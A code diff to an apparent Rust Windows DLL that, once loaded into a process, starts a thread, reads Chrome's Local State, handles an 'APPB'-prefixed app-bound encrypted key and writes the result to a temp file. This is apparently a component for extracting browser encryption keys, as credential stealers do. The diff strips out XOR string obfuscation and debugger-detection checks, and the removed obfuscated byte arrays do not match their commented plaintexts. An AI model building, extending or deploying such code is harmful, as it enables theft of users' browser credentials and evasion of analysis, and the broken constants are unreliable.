@@ -17,46 +17,10 @@ use windows::{
     },
 };
 
-// ============ OBFUSCATION ============
-const XOR_KEY: u8 = 0x5A;
-
-fn xor_decrypt(data: &[u8]) -> String {
-    String::from_utf8(data.iter().map(|&b| b ^ XOR_KEY).collect()).unwrap_or_default()
-}
-
-// Obfuscated constants
-const APPB_XOR: &[u8] = &[0x1A, 0x1B, 0x1C, 0x1D]; // "APPB" XORed
-fn get_appb() -> Vec<u8> {
-    xor_decrypt(APPB_XOR).into_bytes()
-}
-
-const ENV_RESULT_XOR: &[u8] = &[
-    0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29,
-    0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, // "CHROME_RECOVERY_RESULT"
-];
-const ENV_USER_DATA_XOR: &[u8] = &[
-    0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29,
-    0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
-];
-const ENV_DATA_ROOT_XOR: &[u8] = &[
-    0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29,
-    0x2A, 0x2B, 0x2C, 0x2D, 0x2E,
-];
-
-fn get_env_result() -> String {
-    xor_decrypt(ENV_RESULT_XOR)
-}
-fn get_env_user_data() -> String {
-    xor_decrypt(ENV_USER_DATA_XOR)
-}
-fn get_env_data_root() -> String {
-    xor_decrypt(ENV_DATA_ROOT_XOR)
-}
-
-// ============ ANTI-DEBUG ============
-fn is_debugged() -> bool {
-    unsafe { windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent().as_bool() }
-}
+const APPB: &[u8; 4] = b"APPB";
+const RESULT_ENV: &str = "CHROME_RECOVERY_RESULT";
+const USER_DATA_ENV: &str = "CHROME_RECOVERY_USER_DATA_REL";
+const DATA_ROOT_ENV: &str = "CHROME_RECOVERY_DATA_ROOT";
 
 // ============ DLL ENTRY ============
 #[no_mangle]
@@ -66,10 +30,6 @@ pub unsafe extern "system" fn DllMain(
     _: *mut c_void,
 ) -> BOOL {
     if reason == DLL_PROCESS_ATTACH {
-        // Anti-debug early exit
-        if is_debugged() {
-            return TRUE;
-        }
         CreateThread(None, 0, Some(worker), None, THREAD_CREATION_FLAGS(0), None).ok();
     }
     TRUE
@@ -89,10 +49,6 @@ unsafe extern "system" fn worker(_: *mut c_void) -> u32 {
 // ============ MAIN LOGIC (renamed env var access) ============
 
 fn run() -> Result<(), String> {
-    if is_debugged() {
-        return Err("debugged".into());
-    }
-
     let exe = std::env::current_exe()
         .map(|p| p.to_string_lossy().to_lowercase())
         .unwrap_or_default();
@@ -116,7 +72,7 @@ fn run() -> Result<(), String> {
     if encrypted_key.len() < 4 {
         return Err("encrypted key too short".into());
     }
-    if !encrypted_key.starts_with(&get_appb()) {
+    if !encrypted_key.starts_with(APPB) {
         return Err("missing APPB prefix".into());
     }
     let encrypted_key = &encrypted_key[4..];
@@ -154,8 +110,8 @@ fn run() -> Result<(), String> {
 
 fn resolve_local_state_path(exe: &str) -> Result<PathBuf, String> {
     // Use obfuscated env var names
-    if let Ok(rel) = std::env::var(&get_env_user_data()) {
-        let root = match std::env::var(&get_env_data_root()).as_deref() {
+    if let Ok(rel) = std::env::var(USER_DATA_ENV) {
+        let root = match std::env::var(DATA_ROOT_ENV).as_deref() {
             Ok("roaming") => std::env::var("APPDATA"),
             _ => std::env::var("LOCALAPPDATA"),
         }
@@ -186,7 +142,7 @@ fn resolve_local_state_path(exe: &str) -> Result<PathBuf, String> {
 }
 
 fn result_path() -> PathBuf {
-    if let Ok(p) = std::env::var(&get_env_result()) {
+    if let Ok(p) = std::env::var(RESULT_ENV) {
         return PathBuf::from(p);
     }
     std::env::temp_dir().join("chrome_recovery_result.json")
